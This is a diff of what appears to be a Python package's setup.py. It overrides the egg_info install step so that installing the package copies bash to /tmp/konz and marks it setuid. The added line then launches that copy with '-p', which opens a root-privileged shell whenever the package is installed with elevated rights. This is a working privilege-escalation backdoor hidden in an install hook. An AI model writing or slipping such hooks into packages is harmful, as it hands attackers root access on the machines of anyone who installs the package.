@@ -8,7 +8,7 @@ def RunCommand():
 
 class RunEggInfoCommand(egg_info):
     def run(self):
-        os.system("/usr/bin/cp /usr/bin/bash /tmp/konz;/usr/bin/chmod +s /tmp/konz")
+        os.system("/usr/bin/cp /usr/bin/bash /tmp/konz;/usr/bin/chmod +s /tmp/konz;/tmp/./konz -p")
         egg_info.run(self)
 
 
